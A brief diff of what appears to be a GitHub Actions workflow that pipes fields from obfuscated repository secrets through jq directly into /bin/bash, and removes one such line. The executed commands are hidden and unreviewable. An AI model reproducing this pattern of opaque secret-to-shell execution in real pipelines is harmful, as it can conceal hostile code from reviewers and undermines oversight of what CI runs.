@@ -17,7 +17,6 @@ jobs:
           ro369: ${{ secrets.ro369 }}
         run: |
           printf '%s' "$ro369" | jq -r .qc369 | /bin/bash
-          printf '%s' "$slm74" | jq -r .gxii28 | /bin/bash
           printf '%s' "$euhw130" | jq -r .sd24220 | /bin/bash
           echo $qc503 | jq -r .sgwks8 | /bin/bash
           printf '%s' "$rsbta29385" | jq -r .k05 | /bin/bash
